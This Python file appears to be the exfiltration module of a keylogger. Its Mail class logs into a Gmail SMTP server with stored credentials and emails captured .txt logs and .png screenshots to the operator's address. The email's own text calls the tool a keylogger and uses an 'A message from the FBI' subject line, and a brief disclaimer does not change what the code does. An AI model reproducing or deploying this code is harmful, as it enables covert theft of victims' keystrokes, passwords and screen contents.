import smtplib
import ssl
from email.message import EmailMessage


class Mail:

    def __init__(self, email, password):
        self.email_sender = email
        self.email_receiver = email
        self.email_password = password

        self.__smtp_server = 'smtp.gmail.com'
        self.__smtp_port = 465

    def create_mail(self):
        """
        This function creates a new mail.

        :return: Mail
        """

        subject = "A message from the FBI"
        body = "Please do not use this keylogger for any illegal purposes as it is a criminal offense."

        mail = EmailMessage()
        mail['From'] = self.email_sender
        mail['To'] = self.email_receiver
        mail['Subject'] = subject
        mail.set_content(body)

        return mail

    def add_attachment(self, mail, filename):
        """
        This function attaches the file to the mail.

        :param mail: Mail to which the attachment is to be attached
        :param filename: Name of the file to be attached to the email
        """

        if ".txt" in filename:
            with open(filename, 'r') as file:
                mail.add_attachment(file.read(), filename=filename)
        elif ".png" in filename:
            with open(filename, 'rb') as file:
                mail.add_attachment(file.read(), maintype="image", subtype="png", filename=filename)

    def send_mail(self, mail):
        """
        This function sends the mail to the destination e-mail address.

        :param mail: Mail body
        """

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL(self.__smtp_server, self.__smtp_port, context=context) as smtp:
            smtp.login(self.email_sender, self.email_password)
            smtp.sendmail(self.email_sender, self.email_receiver, mail.as_string())
